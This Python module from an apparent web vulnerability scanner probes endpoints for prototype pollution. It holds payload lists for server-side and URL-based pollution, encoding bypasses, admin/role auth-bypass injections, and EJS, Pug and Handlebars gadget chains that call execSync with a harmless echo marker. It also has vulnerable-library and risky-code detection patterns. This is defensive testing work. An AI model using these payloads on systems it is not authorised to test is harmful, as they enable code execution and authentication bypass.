"""
Prototype Pollution Detection Module
Tests: server-side PP (JSON merge), client-side PP (URL params), encoding bypasses,
gadget chain detection (EJS/Pug/Handlebars RCE), vulnerable library scanning.
"""
import asyncio
import json
import logging
import re
from urllib.parse import urlparse

from app.utils.http_client import make_client

logger = logging.getLogger(__name__)
MARKER = "pHnT0m_pp"

# 25+ server-side payloads
SERVER_PAYLOADS = [
    {"__proto__": {"polluted": MARKER}},
    {"constructor": {"prototype": {"polluted": MARKER}}},
    {"a": {"__proto__": {"polluted": MARKER}}},
    {"__proto__": {"__proto__": {"polluted": MARKER}}},
    {"__proto__": {"admin": True}},
    {"__proto__": {"isAdmin": True}},
    {"__proto__": {"role": "admin"}},
    {"__proto__": {"auth": True}},
    {"__proto__": {"verified": True}},
    {"__proto__": {"status": "admin"}},
    {"constructor": {"prototype": {"admin": True}}},
    {"__proto__": {"status": 510, "statusCode": 510}},
    {"__proto__": {"type": "text/html"}},
    {"__proto__": {"allowedHosts": ["evil.com"]}},
    {"__proto__": {"headers": {"X-Polluted": MARKER}}},
    {"__proto__": {"outputFunctionName": f"x;process.mainModule.require('child_process').execSync('echo {MARKER}')//"}},
    {"__proto__": {"client": True, "escapeFunction": f"1;return global.process.mainModule.require('child_process').execSync('echo {MARKER}')"}},
    {"__proto__": {"compileDebug": True, "pendingContent": "x])}catch(o){a])}//"}},
    {"__proto__": {"shell": "/proc/self/exe", "NODE_OPTIONS": "--inspect"}},
    {"__proto__": {"env": {"NODE_OPTIONS": "--require /proc/self/environ"}}},
    {"__proto__": {"view options": {"debug": True, "outputFunctionName": f"x;console.log('{MARKER}');"}}},
    {"__proto__": {"content-type": "text/html"}},
    {"__proto__": {"innerHTML": f"<img src=x onerror=alert('{MARKER}')>"}},
    {"__proto__": {"sourceURL": f"\n;global.process.mainModule.require('child_process').execSync('echo {MARKER}')//"}},
    {"__proto__": {"debug": True, "verbose": True}},
]

CLIENT_VECTORS = [
    f"__proto__[polluted]={MARKER}", f"__proto__.polluted={MARKER}",
    f"constructor[prototype][polluted]={MARKER}", f"constructor.prototype.polluted={MARKER}",
    f"__proto__[__proto__][polluted]={MARKER}",
    "__proto__[isAdmin]=true", "__proto__[role]=admin",
    f"__proto__[innerHTML]={MARKER}", f"__proto__[]={MARKER}",
]

ENCODING_VARIANTS = [
    (f"%5f%5fproto%5f%5f[polluted]={MARKER}", "url_encoded"),
    (f"\\u005f\\u005fproto\\u005f\\u005f[polluted]={MARKER}", "unicode"),
    (f"__Proto__[polluted]={MARKER}", "mixed_case"),
    (f"%255f%255fproto%255f%255f[polluted]={MARKER}", "double_url_encoded"),
]

ENCODED_SERVER_PAYLOADS = [
    {"\\u005f\\u005fproto\\u005f\\u005f": {"polluted": MARKER}},
    {" __proto__ ": {"polluted": MARKER}},
]

POLLUTED_STATUS_CODES = {510, 501, 418}

VULNERABLE_LIBS = {
    "lodash": {"pattern": r"lodash(?:\.min)?\.js", "vuln_versions": ["4.17.11", "4.17.10", "4.17.4", "4.17.2", "3."], "cve": "CVE-2019-10744", "methods": ["_.merge", "_.defaultsDeep", "_.set", "_.zipObjectDeep"]},
    "jquery": {"pattern": r"jquery(?:\.min)?\.js", "vuln_versions": ["1.", "2.", "3.0", "3.1", "3.2", "3.3"], "cve": "CVE-2019-11358", "methods": ["$.extend(true", "jQuery.extend(true"]},
    "minimist": {"pattern": r"minimist", "vuln_versions": ["0.", "1.0", "1.1", "1.2.0", "1.2.1", "1.2.2", "1.2.3", "1.2.4", "1.2.5"], "cve": "CVE-2020-7598"},
    "express": {"pattern": r"express[/@]", "vuln_versions": ["4.17.0", "4.16.", "4.15.", "4.14.", "3."], "cve": "CVE-2024-29041"},
    "ejs": {"pattern": r"ejs[/@]", "vuln_versions": ["3.1.6", "3.1.5", "3.1.4", "3.1.3", "2."], "cve": "CVE-2022-29078"},
    "pug": {"pattern": r"pug[/@]", "vuln_versions": ["3.0.0", "3.0.1", "2."], "cve": "CVE-2021-21353"},
    "handlebars": {"pattern": r"handlebars(?:\.min)?\.js", "vuln_versions": ["4.0", "4.1", "4.2", "4.3", "4.4", "4.5", "4.6", "4.7.6", "3."], "cve": "CVE-2021-23369"},
    "merge": {"pattern": r"(?:deep-?merge|merge-?deep|object-?merge|defaults-?deep)", "vuln_versions": ["all"], "cve": "Multiple CVEs"},
    "hoek": {"pattern": r"hoek[/@]", "vuln_versions": ["0.", "1.", "2.", "3.", "4.", "5.0.0", "5.0.1", "5.0.2", "5.0.3"], "cve": "CVE-2018-3728"},
    "undefsafe": {"pattern": r"undefsafe", "vuln_versions": ["0.", "1.0", "2.0.0", "2.0.1", "2.0.2"], "cve": "CVE-2019-10795"},
}

VULN_CODE_PATTERNS = [
    (r'\$\.extend\s*\(\s*true', "jQuery deep extend"),
    (r'jQuery\.extend\s*\(\s*true', "jQuery deep extend"),
    (r'_\.merge\s*\(', "lodash merge"),
    (r'_\.defaultsDeep\s*\(', "lodash defaultsDeep"),
    (r'_\.set\s*\(', "lodash set"),
    (r'_\.zipObjectDeep\s*\(', "lodash zipObjectDeep"),
    (r'Object\.assign\s*\(\s*\{\}', "Object.assign with empty target"),
    (r'JSON\.parse\s*\(\s*(?:location|document|window)', "JSON.parse from DOM"),
    (r'(?:deepmerge|merge-deep|object-merge)\s*\(', "Deep merge library"),
    (r'\.extend\s*\(\s*true\s*,\s*\{\}', "Generic deep extend"),
]


class PrototypePollutionModule:
    def __init__(self, rate_limit: asyncio.Semaphore = None):
        self.rate_limit = rate_limit or asyncio.Semaphore(5)

    async def check(self, context: dict, db) -> list[dict]:
        endpoints = context.get("endpoints", [])
        base_url = context.get("base_url", "")
        auth_cookie = context.get("auth_cookie")
        technologies = context.get("technologies", {})
        findings = []

        headers = {}
        if auth_cookie:
            if auth_cookie.startswith("token="):
                headers["Authorization"] = f"Bearer {auth_cookie.split('=', 1)[1]}"
            else:
                headers["Cookie"] = auth_cookie

        tech_summary = technologies.get("summary", {})
        tech_str = " ".join(str(k).lower() for k in tech_summary.keys())
        detected_tech = self._detect_technologies(tech_str)

        async with make_client(extra_headers=headers) as client:
            server_findings = await self._check_server_side(client, base_url, endpoints, detected_tech)
            findings.extend(server_findings)
            findings.extend(await self._check_client_side(client, base_url, endpoints))
            findings.extend(await self._check_encoding_variants(client, base_url, endpoints))
            findings.extend(await self._check_vulnerable_libs(client, base_url, endpoints))
            findings.extend(await self._check_vulnerable_code(client, base_url, endpoints))
            if any(f.get("_pollutable_endpoint") for f in server_findings):
                findings.extend(await self._check_gadget_chains(client, server_findings, detected_tech))
        return findings

    def _detect_technologies(self, tech_str: str) -> set:
        detected = set()
        for tech, kws in {"node": ["node", "express", "next", "nuxt", "koa", "fastify", "nest"],
                          "ejs": ["ejs"], "pug": ["pug", "jade"], "handlebars": ["handlebars", "hbs"],
                          "lodash": ["lodash"], "jquery": ["jquery"]}.items():
            if any(kw in tech_str for kw in kws):
                detected.add(tech)
        return detected

    async def _check_server_side(self, client, base_url, endpoints, detected_tech) -> list[dict]:
        findings = []
        json_endpoints = []
        for ep in endpoints:
            url = ep if isinstance(ep, str) else ep.get("url", "")
            method = "GET" if isinstance(ep, str) else ep.get("method", "GET")
            if method in ("POST", "PUT", "PATCH") or "/api/" in url.lower():
                json_endpoints.append({"url": url, "method": method})
        for path in ["/api/settings", "/api/config", "/api/profile", "/api/user", "/api/preferences",
                     "/api/update", "/api/account", "/api/data", "/api/merge", "/api/import",
                     "/api/webhook", "/api/v1/config", "/api/v1/settings", "/api/v2/config"]:
            json_endpoints.append({"url": f"{base_url}{path}", "method": "POST"})

        limit = 20 if "node" in detected_tech else 10
        tested = set()
        for ep in json_endpoints[:limit]:
            url, method = ep["url"], ep["method"]
            key = f"{method}:{url}"
            if key in tested:
                continue
            tested.add(key)

            baseline_status, baseline_body = None, None
            try:
                async with self.rate_limit:
                    bl = await client.post(url, json={"test": "baseline"}) if method in ("POST", "PUT", "PATCH") else await client.get(url)
                    baseline_status, baseline_body = bl.status_code, bl.text
            except Exception:
                continue

            for payload in SERVER_PAYLOADS:
                try:
                    async with self.rate_limit:
                        resp = await (client.patch(url, json=payload) if method == "PATCH" else
                                      client.put(url, json=payload) if method == "PUT" else
                                      client.post(url, json=payload))
                        body, payload_str = resp.text, json.dumps(payload)

                        if MARKER in body and (baseline_body is None or MARKER not in baseline_body):
                            is_rce = any(k in payload_str for k in ["outputFunctionName", "escapeFunction", "sourceURL", "NODE_OPTIONS", "shell"])
                            findings.append({
                                "title": f"Server-Side Prototype Pollution: {urlparse(url).path}",
                                "url": url, "severity": "critical" if is_rce else "high",
                                "vuln_type": "rce" if is_rce else "misconfiguration",
                                "payload": payload_str, "method": method,
                                "impact": "Server-side prototype pollution confirmed. Attacker can modify Object.prototype. May chain to RCE via EJS/Pug/Handlebars.",
                                "remediation": "Use Object.create(null) for merge targets. Filter __proto__ and constructor from input.",
                                "_pollutable_endpoint": {"url": url, "method": method},
                            })

                        if resp.status_code in POLLUTED_STATUS_CODES and baseline_status not in POLLUTED_STATUS_CODES:
                            findings.append({
                                "title": f"Prototype Pollution (Status Overwrite): {urlparse(url).path}",
                                "url": url, "severity": "high", "vuln_type": "misconfiguration",
                                "payload": payload_str, "injected_status": resp.status_code,
                                "impact": f"Server returned status {resp.status_code} after __proto__ injection.",
                                "remediation": "Sanitize __proto__ from all JSON input.",
                                "_pollutable_endpoint": {"url": url, "method": method},
                            })

                        if ("admin" in payload_str or "role" in payload_str) and resp.status_code == 200 and baseline_status in (401, 403):
                            findings.append({
                                "title": f"Prototype Pollution -> Auth Bypass: {urlparse(url).path}",
                                "url": url, "severity": "critical", "vuln_type": "auth_bypass",
                                "payload": payload_str,
                                "impact": "Prototype pollution leads to authentication bypass via injected admin/role properties.",
                                "remediation": "Never derive authorization from pollutable object properties. Use hasOwnProperty().",
                                "_pollutable_endpoint": {"url": url, "method": method},
                            })
                except Exception:
                    continue

            for enc_payload in ENCODED_SERVER_PAYLOADS:
                try:
                    async with self.rate_limit:
                        resp = await client.post(url, json=enc_payload)
                        if MARKER in resp.text and (baseline_body is None or MARKER not in baseline_body):
                            findings.append({
                                "title": f"Prototype Pollution (Encoded Bypass): {urlparse(url).path}",
                                "url": url, "severity": "high", "vuln_type": "misconfiguration",
                                "payload": json.dumps(enc_payload), "method": "POST",
                                "impact": "Server-side prototype pollution via encoded __proto__ key (WAF bypass).",
                                "remediation": "Normalize and filter __proto__ variants including unicode escapes.",
                                "_pollutable_endpoint": {"url": url, "method": "POST"},
                            })
                except Exception:
                    continue
        return findings

    async def _check_client_side(self, client, base_url, endpoints) -> list[dict]:
        findings = []
        test_urls = [base_url]
        for ep in endpoints[:15]:
            url = ep if isinstance(ep, str) else ep.get("url", "")
            if url and not url.lower().startswith(base_url.lower() + "/api/"):
                test_urls.append(url)

        seen = set()
        for url in test_urls[:12]:
            path = urlparse(url).path
            if path in seen:
                continue
            seen.add(path)
            for vector in CLIENT_VECTORS:
                try:
                    sep = "&" if "?" in url else "?"
                    test_url = f"{url}{sep}{vector}"
                    async with self.rate_limit:
                        resp = await client.get(test_url)
                        body = resp.text
                        if MARKER in body:
                            in_script = ("polluted" in body.lower() and
                                         ("<script" in body.lower() or "application/javascript" in body.lower() or ".polluted" in body))
                            if in_script:
                                findings.append({
                                    "title": f"Client-Side Prototype Pollution: {path}",
                                    "url": test_url, "severity": "medium", "vuln_type": "xss",
                                    "payload": vector,
                                    "impact": "Client-side prototype pollution via URL parameters. Can chain with DOM XSS gadgets.",
                                    "remediation": "Use Object.freeze(Object.prototype). Sanitize user input in object operations.",
                                })
                except Exception:
                    continue
        return findings

    async def _check_encoding_variants(self, client, base_url, endpoints) -> list[dict]:
        findings = []
        test_urls = [base_url] + [ep if isinstance(ep, str) else ep.get("url", "") for ep in endpoints[:5] if ep]
        for url in test_urls[:6]:
            for vector, enc_type in ENCODING_VARIANTS:
                try:
                    sep = "&" if "?" in url else "?"
                    async with self.rate_limit:
                        resp = await client.get(f"{url}{sep}{vector}")
                        if MARKER in resp.text:
                            findings.append({
                                "title": f"Client-Side PP (WAF Bypass via {enc_type}): {urlparse(url).path}",
                                "url": f"{url}{sep}{vector}", "severity": "medium", "vuln_type": "xss",
                                "payload": vector, "encoding": enc_type,
                                "impact": f"Prototype pollution via {enc_type} encoding bypasses WAF/filter.",
                                "remediation": "Decode and normalize input before __proto__ filtering.",
                            })
                except Exception:
                    continue
        return findings

    async def _check_vulnerable_libs(self, client, base_url, endpoints) -> list[dict]:
        findings = []
        pages = [base_url] + [ep if isinstance(ep, str) else ep.get("url", "") for ep in endpoints[:5] if ep and (ep if isinstance(ep, str) else ep.get("url", "")) != base_url]
        all_body = ""
        for page_url in pages[:4]:
            try:
                async with self.rate_limit:
                    resp = await client.get(page_url)
                    all_body += resp.text + "\n"
            except Exception:
                continue
        if not all_body:
            return findings

        for lib, info in VULNERABLE_LIBS.items():
            if not re.findall(info["pattern"], all_body, re.IGNORECASE):
                continue
            ver_match = re.search(rf'{re.escape(lib)}[/@]v?(\d+\.\d+\.\d+)', all_body, re.IGNORECASE)
            version = ver_match.group(1) if ver_match else "unknown"
            is_vuln = version == "unknown" or info["vuln_versions"] == ["all"] or any(version.startswith(v) for v in info["vuln_versions"])
            if is_vuln:
                methods_str = ""
                if "methods" in info:
                    found = [m for m in info["methods"] if m in all_body]
                    if found:
                        methods_str = f" Vulnerable methods in use: {', '.join(found)}."
                findings.append({
                    "title": f"Vulnerable Library: {lib} {version} (Prototype Pollution)",
                    "url": base_url, "severity": "high" if methods_str else "medium",
                    "vuln_type": "misconfiguration", "library": lib, "version": version, "cve": info["cve"],
                    "impact": f"{lib} {version} is vulnerable to prototype pollution ({info['cve']}).{methods_str}",
                    "remediation": f"Update {lib} to the latest patched version.",
                })
        return findings

    async def _check_vulnerable_code(self, client, base_url, endpoints) -> list[dict]:
        findings = []
        js_urls = set()
        try:
            async with self.rate_limit:
                resp = await client.get(base_url)
                for m in re.findall(r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)', resp.text, re.I):
                    if m.startswith("//"):      m = "https:" + m
                    elif m.startswith("/"):      m = base_url.rstrip("/") + m
                    elif not m.startswith("http"): m = base_url.rstrip("/") + "/" + m
                    js_urls.add(m)
        except Exception:
            pass
        for ep in endpoints[:10]:
            url = ep if isinstance(ep, str) else ep.get("url", "")
            if url and url.endswith(".js"):
                js_urls.add(url)

        for js_url in list(js_urls)[:15]:
            try:
                async with self.rate_limit:
                    resp = await client.get(js_url)
                    if resp.status_code != 200:
                        continue
                    js_body = resp.text
                    for pattern, desc in VULN_CODE_PATTERNS:
                        match_obj = re.search(pattern, js_body)
                        if match_obj:
                            ctx_s, ctx_e = max(0, match_obj.start() - 50), min(len(js_body), match_obj.end() + 50)
                            findings.append({
                                "title": f"Vulnerable Pattern ({desc}): {urlparse(js_url).path}",
                                "url": js_url, "severity": "medium", "vuln_type": "misconfiguration",
                                "pattern": desc, "code_context": js_body[ctx_s:ctx_e].strip()[:200],
                                "impact": f"JS contains {desc} pattern susceptible to prototype pollution.",
                                "remediation": "Replace deep merge with safe alternatives. Use Object.create(null).",
                            })
                            break
            except Exception:
                continue
        return findings

    async def _check_gadget_chains(self, client, server_findings, detected_tech) -> list[dict]:
        findings = []
        pollutable = []
        for f in server_findings:
            ep = f.get("_pollutable_endpoint")
            if ep and ep not in pollutable:
                pollutable.append(ep)
        if not pollutable:
            return findings

        gadget_chains = [
            {"name": "EJS RCE (outputFunctionName)", "tech": "ejs", "severity": "critical",
             "payload": {"__proto__": {"outputFunctionName": "x;process.mainModule.require('child_process').execSync('echo PHANTOM_GADGET_CHECK')//"}},
             "indicator": "PHANTOM_GADGET_CHECK"},
            {"name": "Pug RCE (escapeFunction)", "tech": "pug", "severity": "critical",
             "payload": {"__proto__": {"client": True, "escapeFunction": "1;return global.process.mainModule.require('child_process').execSync('echo PHANTOM_GADGET_CHECK')"}},
             "indicator": "PHANTOM_GADGET_CHECK"},
            {"name": "Handlebars RCE (pendingContent)", "tech": "handlebars", "severity": "critical",
             "payload": {"__proto__": {"compileDebug": True, "pendingContent": "x])}catch(o){a])}//PHANTOM_GADGET_CHECK"}},
             "indicator": "PHANTOM_GADGET_CHECK"},
            {"name": "Express Content-Type Override", "tech": "node", "severity": "high",
             "payload": {"__proto__": {"content-type": "text/html", "type": "text/html"}},
             "indicator": "text/html", "check_header": "content-type"},
            {"name": "Express CORS Pollution", "tech": "node", "severity": "high",
             "payload": {"__proto__": {"allowedOrigins": ["*"], "credentials": True}},
             "indicator": None, "check_header": "access-control-allow-origin"},
        ]

        for ep in pollutable[:5]:
            url, method = ep["url"], ep["method"]
            for gadget in gadget_chains:
                if gadget["tech"] not in detected_tech and gadget["tech"] != "node":
                    continue
                try:
                    async with self.rate_limit:
                        resp = await (client.patch(url, json=gadget["payload"]) if method == "PATCH" else
                                      client.put(url, json=gadget["payload"]) if method == "PUT" else
                                      client.post(url, json=gadget["payload"]))
                        confirmed, evidence = False, ""
                        if gadget.get("indicator") and gadget["indicator"] in resp.text:
                            confirmed, evidence = True, f"Indicator '{gadget['indicator']}' in response body"
                        if gadget.get("check_header"):
                            hv = resp.headers.get(gadget["check_header"], "")
                            if gadget.get("indicator") and gadget["indicator"] in hv:
                                confirmed, evidence = True, f"Header {gadget['check_header']}={hv}"
                        if not confirmed:
                            async with self.rate_limit:
                                vr = await client.get(url)
                                if gadget.get("indicator") and gadget["indicator"] in vr.text:
                                    confirmed, evidence = True, "Indicator in follow-up GET (persistent pollution)"
                        if confirmed:
                            findings.append({
                                "title": f"Prototype Pollution -> {gadget['name']}: {urlparse(url).path}",
                                "url": url, "severity": gadget["severity"],
                                "vuln_type": "rce" if gadget["severity"] == "critical" else "misconfiguration",
                                "payload": json.dumps(gadget["payload"]), "gadget_chain": gadget["name"],
                                "evidence": evidence,
                                "impact": f"Prototype pollution chains to {gadget['name']}. Confirmed exploitable gadget chain.",
                                "remediation": "Fix prototype pollution at root. Update template engines to patched versions.",
                            })
                except Exception:
                    continue
        return findings
